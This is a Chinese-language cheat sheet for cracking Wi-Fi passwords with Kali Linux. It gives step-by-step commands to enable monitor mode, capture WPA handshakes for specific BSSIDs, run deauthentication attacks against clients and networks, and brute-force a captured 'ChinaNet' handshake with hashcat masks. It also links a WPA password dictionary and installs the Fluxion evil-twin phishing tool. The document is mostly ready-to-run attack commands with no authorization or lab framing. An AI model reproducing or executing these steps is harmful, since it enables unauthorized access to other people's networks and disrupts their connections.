# Kali WIFI 破解

## 1.监听

```
airmon-ng start wlan0
```

## 2.搜索网络

```
airodump-ng wlan0mon
```

## 3.监听 Wi-Fi 抓包

> -w handshark
>
> 抓包放在 handshark
>
> -c 信道
>
> --bssid 网络 MAC 地址
>
> wlan0mon 监听网络

```
airodump-ng -w handshark -c 4 --bssid 04:20:84:0D:18:29 wlan0mon
```

## 4.ACK 攻击

```
# 攻击客户机
aireplay-ng --deauth 10 -a 74:05:A5:8F:04:B7 -c 74:05:A5:8F:04:B7 wlan0mon --ignore-negative-one

# 攻击网络
aireplay-ng --deauth 0 -a 18:F2:2C:26:30:70 --ignore-negative-one wlan0mon
```

## Hashcat

```
-a  指定要使用的破解模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。
-m  指定要破解的hash类型，如果不指定类型，则默认是MD5
-o  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中
--force 忽略破解过程中的警告信息,跑单条hash可能需要加上此选项
--show  显示已经破解的hash及该hash所对应的明文
--increment  启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程
--increment-min  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用
--increment-max  密码最大长度,同上
--outfile-format 指定破解结果的输出格式id,默认是3
--username   忽略hash文件中的指定的用户名,在破解linux系统用户密码hash可能会用到
--remove     删除已被破解成功的hash
-r       使用自定义破解规则
--session 保存进度
--session <session> --restore 恢复进度
```

- 破解 8-11 位数字+小写

```
.\hashcat.exe -a 3 -m 22000 "C:\Users\Goojoe\Desktop\wifi-path\ChinaNet-6uG9Cu.hc22000" -o "C:\Users\Goojoe\Desktop\wifi-path\passwd.txt" --increment --increment-min 8 --increment-max 11 --custom-charset1 ?l?d ?1?1?1?1?1?1?1?1?1?1?1

.\hashcat.exe -a 3 -m 22000 "C:\Users\Goojoe\Desktop\wifi-path\ChinaNet-6uG9Cu.hc22000" -o "C:\Users\Goojoe\Desktop\wifi-path\passwd.txt" --increment --increment-min 8 --increment-max 11 --custom-charset1 ?l?d ?1?1?1?1?1?1?1?1?1?1?1 --session 6uG9Cu
```

## 字典

- [Github](https://github.com/conwnet/wpa-dictionary)

```
git clone https://gitclone.com/github.com/conwnet/wpa-dictionary.git
```


## Fluixon

### 1.安装
```
# 国内
git clone https://gitclone.com/github.com/FluxionNetwork/fluxion.git

# 国外
git clone https://www.github.com/FluxionNetwork/fluxion.git

# 进入fluxion目录
cd fluxion

# 安装
sudo chmod +x ./fluxion.sh && ./fluxion.sh -i
```
